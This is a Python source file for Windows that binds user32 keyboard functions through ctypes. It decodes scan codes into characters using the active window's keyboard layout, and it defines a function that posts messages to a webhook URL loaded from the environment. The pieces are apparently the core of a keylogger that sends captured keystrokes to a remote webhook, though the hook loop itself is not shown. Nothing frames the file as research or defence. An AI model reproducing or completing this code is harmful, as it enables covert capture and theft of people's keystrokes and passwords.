import ctypes
import os
import requests
from ctypes import wintypes
from dotenv import load_dotenv

load_dotenv()

WEBHOOK_URL = os.environ.get('WEBHOOK_URL')

user32 = ctypes.WinDLL('user32', use_last_error=True)

user32.MapVirtualKeyExW.argtypes = [wintypes.UINT, wintypes.UINT, wintypes.HKL]
user32.MapVirtualKeyExW.restype = wintypes.UINT
MAPVK_VSC_TO_VK_EX = 3

user32.GetKeyboardState.argtypes = [ctypes.POINTER(ctypes.c_uint8 * 256)]
user32.GetKeyboardState.restype = wintypes.BOOL

user32.ToUnicodeEx.argtypes = [
    wintypes.UINT,
    wintypes.UINT,
    ctypes.POINTER(ctypes.c_uint8 * 256),
    wintypes.LPWSTR,
    ctypes.c_int,
    wintypes.UINT,
    wintypes.HKL
]
user32.ToUnicodeEx.restype = ctypes.c_int

user32.GetForegroundWindow.restype = wintypes.HWND
user32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
user32.GetWindowThreadProcessId.restype = wintypes.DWORD
user32.GetKeyboardLayout.argtypes = [wintypes.DWORD]
user32.GetKeyboardLayout.restype = wintypes.HKL


def char_for_layout(scan_code, hkl):
    vk = user32.MapVirtualKeyExW(scan_code, MAPVK_VSC_TO_VK_EX, hkl)
    ks = (ctypes.c_uint8 * 256)()
    user32.GetKeyboardState(ctypes.byref(ks))
    buf = ctypes.create_unicode_buffer(8)
    n = user32.ToUnicodeEx(vk, scan_code, ctypes.byref(ks), buf, len(buf), 0, hkl)
    return buf.value[:n] if n > 0 else ''


def decode(scan_code):
    hwnd = user32.GetForegroundWindow()
    pid = wintypes.DWORD()
    tid = user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    hkl = user32.GetKeyboardLayout(tid)
    return char_for_layout(scan_code, hkl)


def send_message(message):
    payload = {"content": message}
    requests.post(WEBHOOK_URL, data=payload)
